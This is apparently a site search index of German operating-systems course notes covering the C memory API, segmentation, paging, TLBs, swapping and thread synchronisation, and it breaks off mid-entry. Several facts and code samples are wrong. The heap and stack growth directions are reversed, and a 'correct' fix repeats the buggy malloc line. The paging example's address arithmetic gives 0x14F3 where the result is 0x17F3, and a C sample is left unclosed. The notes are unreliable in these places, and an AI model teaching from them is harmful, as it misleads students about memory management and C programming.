C, <code>new</code> in Java).</li> <li>W\u00e4chst nach unten im Speicher.</li> </ul> <p>3\ufe0f\u20e3 Stack-Segment</p> <ul> <li>Speichert lokale Variablen, Funktionsaufrufe, Parameter und R\u00fcckgabewerte.</li> <li>W\u00e4chst nach oben im Speicher.</li> </ul> <p>\ud83d\udd39 Heap und Stack wachsen dynamisch aufeinander zu, um den Speicher effizient zu nutzen.</p> <p></p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/1.%20Memory%20API%20%28Speicherverwaltung%20in%20C%29/","title":"Memory API (Speicherverwaltung in C)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/1.%20Memory%20API%20%28Speicherverwaltung%20in%20C%29/#memory-api-speicherverwaltung-in-c","title":"Memory API (Speicherverwaltung in C)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/1.%20Memory%20API%20%28Speicherverwaltung%20in%20C%29/#1-speicherallokation-in-c","title":"\ud83d\udcda 1\ufe0f\u20e3 Speicherallokation in C","text":"<p>Die Speicherverwaltung in C kann entweder \u00fcber den Stack oder den Heap erfolgen.</p> <p>\u2705 Stack (Automatische Speicherverwaltung)</p> <ul> <li>Speicher f\u00fcr lokale Variablen wird automatisch reserviert und freigegeben.</li> <li> <p>Beispiel:</p> <pre><code>void func() { \n    int x = 3;  // Speicher wird automatisch auf dem Stack reserviert\n}\n</code></pre> </li> </ul> <p>\u2705 Heap (Manuelle Speicherverwaltung mit malloc/free)</p> <ul> <li>Speicher wird explizit mit <code>malloc()</code> angefordert und mit <code>free()</code> freigegeben.</li> <li> <p>Beispiel:</p> <pre><code>int *x = malloc(sizeof(int) * 4);  // Speicherblock f\u00fcr 4 Ganzzahlen\nfree(x);  // Freigabe des Speichers\n</code></pre> </li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/1.%20Memory%20API%20%28Speicherverwaltung%20in%20C%29/#2-haufige-fehler-bei-der-speicherverwaltung","title":"\u26a0\ufe0f 2\ufe0f\u20e3 H\u00e4ufige Fehler bei der Speicherverwaltung","text":"<p>\u274c Vergessen, Speicher zu allokieren</p> <pre><code>    int *x = malloc(sizeof(int) * 4);  // Speicherblock f\u00fcr 4 Ganzzahlen\n    free(x);  // Freigabe des Speichers\n</code></pre> <p>\u2705 Korrekt:</p> <pre><code>    char *dst = malloc(strlen(\"hello\") + 1);\n    strcpy(dst, \"hello\");\n</code></pre> <p>\u274c Nicht gen\u00fcgend Speicher allokiert</p> <pre><code>    char *dst = malloc(strlen(\"hello\"));  // \u274c Kein Platz f\u00fcr das Null-Terminierungszeichen!\n</code></pre> <p>\u2705 Korrekt:</p> <pre><code>    char *dst = malloc(strlen(\"hello\"));  // \u274c Kein Platz f\u00fcr das Null-Terminierungszeichen!\n</code></pre> <p>\u274c Vergessen, Speicher freizugeben (Memory Leak)</p> <pre><code>    int *x = malloc(sizeof(int) * 4);\n// \u274c Falls free(x) nicht aufgerufen wird, bleibt der Speicher belegt!\n</code></pre> <p>\u2705 Korrekt:</p> <pre><code>    free(x);\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/1.%20Memory%20API%20%28Speicherverwaltung%20in%20C%29/#3-erweiterte-speicherfunktionen","title":"\ud83d\udee0\ufe0f 3\ufe0f\u20e3 Erweiterte Speicherfunktionen","text":"<ul> <li><code>realloc()</code> - Erweitert oder verkleinert einen bereits allokierten Speicherbereich.</li> </ul> <p><code>c     int *x = malloc(4 * sizeof(int));     x = realloc(x, 8 * sizeof(int));  // Gr\u00f6\u00dfe verdoppeln</code></p> <ul> <li><code>mmap()</code> - Direktes Mapping von Speicherbereichen.</li> </ul> <pre><code>    void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/","title":"Address Translation (Adress\u00fcbersetzung &amp; Virtual Memory)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#address-translation-adressubersetzung-virtual-memory","title":"Address Translation (Adress\u00fcbersetzung &amp; Virtual Memory)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#1-warum-brauchen-wir-adressubersetzung","title":"\ud83d\udcda 1\ufe0f\u20e3 Warum brauchen wir Adress\u00fcbersetzung?","text":"<p>Betriebssysteme nutzen virtuelle Speicheradressen, die zur physischen Speicheradresse umgerechnet werden. Das sorgt f\u00fcr mehr Sicherheit &amp; Flexibilit\u00e4t:</p> <ul> <li>\ud83d\udd39 Schutz: Prozesse k\u00f6nnen nicht auf andere Speicherbereiche zugreifen.</li> <li>\ud83d\udd39 Speichereffizienz: Speicher kann dynamisch verwaltet werden.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#2-adressubersetzung-virtuell-physisch","title":"\ud83d\udd0d 2\ufe0f\u20e3 Adress\u00fcbersetzung: Virtuell \u2192 Physisch","text":"<p>\ud83d\udccc Direkte Adress\u00fcbersetzung durch Hardware Die CPU \u00fcbersetzt virtuelle Adressen in physische Adressen mithilfe von Page Tables oder TLBs (Translation Lookaside Buffers).</p> <p>\u2705 Beispiel f\u00fcr eine einfache Adress\u00fcbersetzung:</p> <pre><code>    movl 0x0(%ebx), %eax   ; Lade Wert aus Speicheradresse in Register\n    addl $0x03, %eax       ; Addiere 3\n    movl %eax, 0x0(%ebx)   ; Speicher den neuen Wert\n</code></pre> <p>\ud83d\udd39 Die Adresse im Register <code>%ebx</code> wird von der Page Table in die physische Adresse \u00fcbersetzt.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#3-dynamische-speicherverwaltung-base-bounds-register","title":"\u2699\ufe0f 3\ufe0f\u20e3 Dynamische Speicherverwaltung: Base &amp; Bounds Register","text":"<p>\ud83d\udccc Base Register</p> <ul> <li>Speichert die Startadresse eines Prozesses im physischen Speicher.</li> <li>Die virtuelle Adresse wird einfach um diesen Wert verschoben.</li> </ul> <p>\ud83d\udccc Bounds Register</p> <ul> <li>Speichert die maximale erlaubte Adresse.</li> <li>Falls ein Prozess au\u00dferhalb seines erlaubten Bereichs liest/schreibt, wird er gestoppt.</li> </ul> <p>\u2705 Beispiel:</p> <pre><code>    movl 0x0(%ebx), %eax  ; Virtuelle Adresse \u2192 Physische Adresse\n    addl $0x03, %eax      ; 3 addieren\n    movl %eax, 0x0(%ebx)  ; Speichern\n</code></pre> <p>\u27a1 Die Hardware \u00fcbersetzt <code>%ebx + Base Register</code> \u2192 Physische Adresse</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#4-speicherorganisation-segmentierung","title":"\ud83d\udd25 4\ufe0f\u20e3 Speicherorganisation &amp; Segmentierung","text":"<p>In modernen Systemen gibt es verschiedene Methoden, den Speicher zu verwalten:</p> <p>\u2705 Paging (Seitenbasiertes Speicherlayout)</p> <ul> <li>Speicher wird in gleich gro\u00dfe Seiten unterteilt (z. B. 4KB pro Seite).</li> <li>Der Page Table verwaltet die Zuordnung zwischen virtuellen Seiten und physischem Speicher.</li> </ul> <p>\u2705 Segmentation (Segmentbasiertes Speicherlayout)</p> <ul> <li>Speicher ist in variable gro\u00dfe Segmente unterteilt (Code, Heap, Stack).</li> <li>Segmente k\u00f6nnen sich dynamisch vergr\u00f6\u00dfern/verkleinern.</li> </ul> <p>\u2705 Swapping</p> <ul> <li>Falls der physische Speicher voll ist, kann das OS Speicherbereiche auf die Festplatte auslagern.</li> <li>Das sorgt f\u00fcr virtuellen Speicher, verlangsamt aber Programme.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/2.%20Address%20Translation%20%28Adress%C3%BCbersetzung%20%26%20Virtual%20Memory%29/#5-fazit-warum-ist-adressubersetzung-wichtig","title":"\ud83d\ude80 5\ufe0f\u20e3 Fazit: Warum ist Adress\u00fcbersetzung wichtig?","text":"<ul> <li>\ud83d\udee1\ufe0f Schutz: Kein unautorisierter Zugriff auf Speicher.</li> <li>\u26a1 Effizienz: Betriebssystem kann Speicher intelligent verwalten.</li> <li>\ud83d\udd04 Flexibilit\u00e4t: Prozesse k\u00f6nnen im Speicher verschoben werden, ohne ihre Adresse \u00e4ndern zu m\u00fcssen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/","title":"Basic-Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#basic-speicherverwaltung","title":"Basic-Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#segmentierung-memory-segmentation","title":"Segmentierung (Memory Segmentation)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#1-was-ist-segmentierung","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist Segmentierung?","text":"<p>Segmentierung ist eine Speicherverwaltungsstrategie, die Adressr\u00e4ume in logische Segmente unterteilt, z. B.:</p> <ul> <li>Code-Segment</li> <li>Daten-Segment</li> <li>Heap-Segment</li> <li>Stack-Segment</li> </ul> <p>Jedes dieser Segmente kann unabh\u00e4ngig an verschiedenen Stellen im physischen Speicher platziert werden.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#wie-funktioniert-segmentierung","title":"\ud83d\udccc Wie funktioniert Segmentierung?","text":"<ol> <li>Jeder Prozess hat eine Segmenttabelle, die Basisadressen und L\u00e4ngen speichert.</li> <li>Virtuelle Adresse (Segment, Offset) \u2192 Physische Adresse (Basis + Offset).</li> <li>Falls <code>Offset &gt; L\u00e4nge des Segments</code> \u2192 Fehler (Segmentation Fault).</li> </ol> <p>\u2705 Vorteile:</p> <ul> <li>Programme k\u00f6nnen logisch strukturiert werden (kein zusammenh\u00e4ngender Speicher n\u00f6tig).</li> <li>Schutzmechanismen durch Lesen/Schreiben-Ausf\u00fchrungsrechte f\u00fcr Segmente.</li> </ul> <p>\ud83d\udea8 Probleme:</p> <ul> <li>Externe Fragmentierung: Speicher kann zwischen Segmenten fragmentieren.<ul> <li>L\u00f6sung: Speicherkonsolidierung (Compaction), jedoch kostenintensiv\u200b</li> </ul> </li> <li>Aufwendige Speicherverwaltung: OS muss Segmentgr\u00f6\u00dfen dynamisch anpassen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#beispiel-adressubersetzung-in-segmentierung","title":"\ud83d\udd0d Beispiel: Adress\u00fcbersetzung in Segmentierung","text":"Segment Basisadresse L\u00e4nge 0 1000 400 1 1400 600 2 2000 500 <p>Wenn die virtuelle Adresse <code>(1, 50)</code> gegeben ist:</p> <ul> <li>Physische Adresse = Basisadresse[1] + Offset = 1400 + 50 = 1450. \u2705</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#freispeicherverwaltung-free-space-management","title":"Freispeicherverwaltung (Free Space Management)","text":"<p>Wenn Prozesse Speicher freigeben, entstehen L\u00fccken im Speicher \u2192 Fragmentierung!</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#1-methoden-zur-verwaltung-von-freiem-speicher","title":"\ud83d\udccc 1\ufe0f\u20e3 Methoden zur Verwaltung von freiem Speicher","text":"<ul> <li> <p>Splitting &amp; Coalescing:</p> <ul> <li>Falls ein Block zu gro\u00df ist \u2192 aufteilen (Splitting).</li> <li>Falls benachbarte Bl\u00f6cke frei werden \u2192 zusammenf\u00fchren (Coalescing).</li> <li> <p>Dynamische Speicherverwaltung mit <code>malloc()</code> und <code>free()</code></p> </li> <li> <p><code>malloc(size_t size)</code>: Fordert Speicher an.</p> </li> <li><code>free(void *ptr)</code>: Gibt Speicher zur\u00fcck, ohne eine Gr\u00f6\u00dfe zu ben\u00f6tigen\u200b.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/3.%20Basic-Speicherverwaltung/#2-strategien-zur-speicherallokation","title":"\ud83d\udee0 2\ufe0f\u20e3 Strategien zur Speicherallokation","text":"<ul> <li>Best-Fit: W\u00e4hlt den kleinsten geeigneten freien Block.</li> <li>Worst-Fit: W\u00e4hlt den gr\u00f6\u00dften verf\u00fcgbaren Block.</li> <li>First-Fit: W\u00e4hlt den ersten passenden Block.</li> <li>Next-Fit: \u00c4hnlich wie First-Fit, beginnt aber die Suche an der letzten Allokationsstelle</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/","title":"Advanced Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#advanced-speicherverwaltung","title":"Advanced Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#einfuhrung-in-paging","title":"Einf\u00fchrung in Paging","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#paging-lost-das-segmentierungsproblem","title":"\ud83c\udfaf Paging l\u00f6st das Segmentierungsproblem!","text":"<ul> <li>Speicher wird in gleich gro\u00dfe Seiten (z. B. 4 KB) unterteilt.</li> <li>Jede virtuelle Seite (Page) wird auf eine physische Seite (Frame) gemappt.</li> <li>Kein Problem mit externer Fragmentierung \u2192 kleinere Einheiten helfen!</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#wie-funktioniert-paging","title":"\ud83d\udd0d Wie funktioniert Paging?","text":"<ol> <li>Die virtuelle Adresse besteht aus:<ul> <li>Page Number (Seitenindex) \u2192 Welche Seite?</li> <li>Offset \u2192 Welcher Teil der Seite?</li> </ul> </li> <li>\u00dcbersetzung durch Page Table:<ul> <li><code>Virtuelle Adresse \u2192 Physische Adresse (Page Table Lookup).</code></li> <li>Falls Seite nicht im Speicher ist \u2192 Page Fault \u2192 Swapping.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#beispiel-adressubersetzung-in-paging","title":"\ud83d\udda5 Beispiel: Adress\u00fcbersetzung in Paging","text":"<p>Gegeben:</p> <ul> <li>Virtuelle Adresse = <code>0x09F3</code></li> <li>Seitengr\u00f6\u00dfe = <code>0x400</code> (1024 Bytes)</li> </ul> <p>Berechnung:</p> <ol> <li>Page Number = <code>0x09F3 \u00f7 0x400</code> = <code>2</code></li> <li>Offset innerhalb der Seite = <code>0x09F3 % 0x400</code> = <code>0x3F3</code></li> <li>Seiten\u00fcbersetzung:<ul> <li>Page Table sagt: <code>Virtuelle Seite 2 \u2192 Physische Seite 5</code></li> <li>Physische Adresse = 5 * 1024 + 0x3F3 = 0x14F3. \u2705</li> </ul> </li> </ol> <p>\u2705 Vorteile von Paging:</p> <ul> <li>Kein externes Fragmentierungsproblem.</li> <li>Erlaubt Speicherverteilung auf nicht zusammenh\u00e4ngende Frames.</li> </ul> <p>\ud83d\udea8 Problem: Gro\u00dfe Page Tables \u2192 Hoher Speicherverbrauch! \u27a1 L\u00f6sung: TLBs &amp; Mehrstufige Page Tables (Kapitel 19-20).</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#paging-schnellere-ubersetzungen-mit-tlbs","title":"Paging - Schnellere \u00dcbersetzungen mit TLBs","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#warum-sind-page-tables-langsam","title":"\ud83d\udd25 Warum sind Page Tables langsam?","text":"<ul> <li>Jeder Speicherzugriff ben\u00f6tigt 2 Speicheroperationen:<ol> <li>Suche in der Page Table.</li> <li>Zugriff auf den eigentlichen Speicher.</li> </ol> </li> </ul> <p>\u2705 L\u00f6sung: Translation Lookaside Buffer (TLB)</p> <ul> <li>Ein Cache f\u00fcr Page Table Eintr\u00e4ge.</li> <li>Speichert die zuletzt verwendeten \u00dcbersetzungen.</li> <li>Falls TLB-Hit: Direkte Adress\u00fcbersetzung (ohne Page Table Zugriff).</li> <li>Falls TLB-Miss: Normaler Zugriff auf Page Table.</li> </ul> <pre><code>// Translation Lookaside Buffer (TLB) Lookup Algorithmus\nVPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT\n\n(Success, TlbEntry) = TLB_Lookup(VPN)\n\nif (Success == True)  // TLB Hit\n{\n    if (CanAccess(TlbEntry.ProtectBits) == True)\n    {\n        Offset = VirtualAddress &amp; OFFSET_MASK\n        PhysAddr = (TlbEntry.PFN &lt;&lt; SHIFT) | Offset\n        Register = AccessMemory(PhysAddr)\n    }\n    else\n    {\n        RaiseException(PROTECTION_FAULT)  // Zugriffsverletzung\n    }\n}\nelse  // TLB Miss\n{\n    RaiseException(TLB_MISS)  // Seitenfehler oder TLB-Eintrag nicht gefunden\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#tlb-hitmiss-performance-beispiel","title":"\ud83d\udcca TLB-Hit/Miss Performance Beispiel","text":"<ul> <li>Ohne TLB: 200 ns pro Speicherzugriff.</li> <li>Mit TLB (95% Hit-Rate): <code>0.95 \u00d7 100 ns + 0.05 \u00d7 200 ns = 105 ns (fast doppelt so schnell).</code></li> </ul> <p>\u2705 Vorteil: Reduziert den Overhead von Paging erheblich.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#mehrstufige-page-tables","title":"Mehrstufige Page Tables","text":"<p>\ud83d\ude80 Problem: Einfache Page Tables sind zu gro\u00df! Ein 64-Bit System mit 4 KB Seiten br\u00e4uchte gigantische Page Tables.</p> <p>\u2705 L\u00f6sung: Mehrstufige Page Tables</p> <ul> <li>Hierarchische Struktur:<ul> <li>Erste Stufe zeigt auf zweite Stufe, zweite auf dritte usw.</li> <li>Nur ben\u00f6tigte Teile der Page Table werden im Speicher gehalten.</li> </ul> </li> </ul> <p>Beispiel: 3-stufige Page Table f\u00fcr 64-Bit Speicherverwaltung</p> <ol> <li>Level 1 Table \u2192 Level 2 Table \u2192 Level 3 Table \u2192 Frame.</li> <li>Erspart Speicherplatz, weil nur genutzte Tabellen geladen werden.</li> </ol> <p>\u2705 Vorteil: Verbraucht deutlich weniger Speicher f\u00fcr Page Tables.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#swapping-speicher-auf-festplatte-auslagern","title":"Swapping - Speicher auf Festplatte auslagern","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#was-ist-swapping","title":"\ud83c\udfaf Was ist Swapping?","text":"<ul> <li>Falls der physische RAM voll ist, werden Speicherbereiche auf die Festplatte ausgelagert.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#wann-wird-swapping-genutzt","title":"\ud83d\udd25 Wann wird Swapping genutzt?","text":"<ul> <li>Wenn ein neuer Prozess Speicher ben\u00f6tigt, aber der RAM voll ist.</li> <li>Das OS w\u00e4hlt eine nicht benutzte Seite und speichert sie auf der Festplatte.</li> </ul> <p>\ud83d\udea8 Problem: Swapping auf HDDs ist extrem langsam (Millisekunden!). \u27a1 Moderne Betriebssysteme nutzen SSDs oder versuchen Swapping zu vermeiden.</p> <p>\u2705 L\u00f6sung: Page Replacement Policies</p> <ul> <li>FIFO: \u00c4lteste Seite rauswerfen.</li> <li>LRU (Least Recently Used): Am l\u00e4ngsten nicht genutzte Seite rauswerfen.</li> <li>Clock Algorithmus: Verbessert LRU, indem er Seiten pr\u00fcft, ob sie noch genutzt werden.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#swapping-strategien-page-replacement","title":"Swapping-Strategien &amp; Page Replacement","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#problem-wann-wie-wird-ausgelagert","title":"\ud83d\udd0d Problem: Wann &amp; wie wird ausgelagert?","text":"<ul> <li>Zu viel Swapping f\u00fchrt zu Thrashing (System ist nur noch mit Swapping besch\u00e4ftigt).</li> </ul> <p>\u2705 L\u00f6sungen:</p> <ul> <li>Page Replacement Algorithmen:<ol> <li>FIFO: \u00c4lteste Seite rauswerfen.</li> <li>LRU: Seite, die am l\u00e4ngsten nicht benutzt wurde.</li> <li>Clock Algorithmus: Effizientere Version von LRU.</li> </ol> </li> </ul> <p>\u2705 Moderne Betriebssysteme:</p> <ul> <li>Nutzen hybride Algorithmen und Machine Learning, um das beste Swapping-Verhalten zu finden.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/4.%20Advanced-Speicherverwaltung%201/#fazit","title":"\ud83d\ude80 Fazit","text":"<p>Paging &amp; Swapping sind essentiell f\u00fcr moderne Betriebssysteme.</p> <ul> <li>Paging l\u00f6st Fragmentierungsprobleme.</li> <li>TLBs machen Paging schneller.</li> <li>Swapping erm\u00f6glicht mehr Prozesse, kostet aber Leistung.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/","title":"\ud83c\udfd7\ufe0f Einf\u00fchrung in Concurrency","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#einfuhrung-in-concurrency","title":"\ud83c\udfd7\ufe0f Einf\u00fchrung in Concurrency","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#1-einfuhrung-in-concurrency","title":"\ud83d\ude80 1. Einf\u00fchrung in Concurrency","text":"<p>Concurrency (Nebenl\u00e4ufigkeit) bezeichnet die F\u00e4higkeit eines Systems, mehrere Aufgaben gleichzeitig auszuf\u00fchren. Moderne Betriebssysteme und Multi-Core-Prozessoren machen Concurrency zu einem wesentlichen Konzept.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#warum-concurrency","title":"Warum Concurrency?","text":"<ul> <li>Effizienz: Optimale Nutzung von CPU-Kernen.</li> <li>Reaktionsf\u00e4higkeit: Erh\u00f6ht die Interaktivit\u00e4t von Anwendungen.</li> <li>Skalierbarkeit: Bessere Performance auf Multi-Core-Systemen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#2-threads-grundlagen-api","title":"\ud83e\uddf5 2. Threads: Grundlagen &amp; API","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#was-sind-threads","title":"Was sind Threads?","text":"<p>Ein Thread ist eine leichtgewichtige Untereinheit eines Prozesses. Mehrere Threads eines Prozesses teilen sich denselben Speicherraum.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#threads-in-verschiedenen-sprachen","title":"Threads in verschiedenen Sprachen","text":"\ud83d\udcdd C-Code (POSIX Threads)\u2615 Java-Code (Java Threads)\ud83d\udc0d Python-Code (Threading Modul) <pre><code>#include &lt;pthread.h&gt; \n#include &lt;stdio.h&gt; \nvoid* thread_function(void* arg) { \n    printf(\"Hello from thread!\\\\n\"); return NULL; \n} \nint main() { \n    pthread_t thread; pthread_create(&amp;thread, NULL, thread_function, NULL);\n    pthread_join(thread, NULL); return 0; \n}\n</code></pre> <pre><code>class MyThread extends Thread {\n    public void run() {\n        System.out.println(\"Hello from thread!\");\n    }\n}\n\npublic class Main { \n    public static void main(String[] args) { \n        MyThread t = new MyThread(); t.start(); \n    } \n}\n</code></pre> <pre><code>import threading\n\ndef thread_function():\n    print(\"Hello from thread!\")\n\nthread = threading.Thread(target=thread_function)\nthread.start()\nthread.join()\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#3-race-conditions-synchronisation","title":"\u26a0\ufe0f 3. Race Conditions &amp; Synchronisation","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#race-condition","title":"Race Condition","text":"<p>Ein Race Condition tritt auf, wenn mehrere Threads gleichzeitig auf eine geteilte Ressource zugreifen und das Ergebnis von der Reihenfolge der Zugriffe abh\u00e4ngt.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#beispiel-einer-race-condition-in-c","title":"Beispiel einer Race Condition in C","text":"<pre><code>```c\n#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n\nint counter = 0;\n\nvoid* increment(void* arg) {\n    for (int i = 0; i &lt; 100000; i++) {\n        counter++;  // \ud83d\udd34 Race Condition! !!FIX MIT LOCKS!!\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    pthread_create(&amp;t1, NULL, increment, NULL);\n    pthread_create(&amp;t2, NULL, increment, NULL);\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    printf(\"Counter: %d\\\\n\", counter);  // \u274c Inkonsistentes Ergebnis!\n    return 0;\n```\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#losung-synchronisation-mit-locks","title":"L\u00f6sung: Synchronisation mit Locks","text":"\ud83d\udcdd C-Code mit Mutex\u2615 Java mit Synchronized\ud83d\udc0d Python mit Lock <pre><code>void* increment(void* arg) {\n    for (int i = 0; i &lt; 100000; i++) {\n        pthread_mutex_lock(&amp;lock);\n        counter++;\n        pthread_mutex_unlock(&amp;lock);\n    }\n}\n</code></pre> <pre><code>java class Counter { \n    private int count = 0;\n\n    public synchronized void increment() { \n        count++; \n    } \n}\n</code></pre> <pre><code>counter = 0\nlock = threading.Lock()\n\ndef increment():\n    global counter\n    with lock:\n        counter += 1\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#4-locks-semaphoren-deadlocks","title":"\ud83d\udd10 4. Locks, Semaphoren &amp; 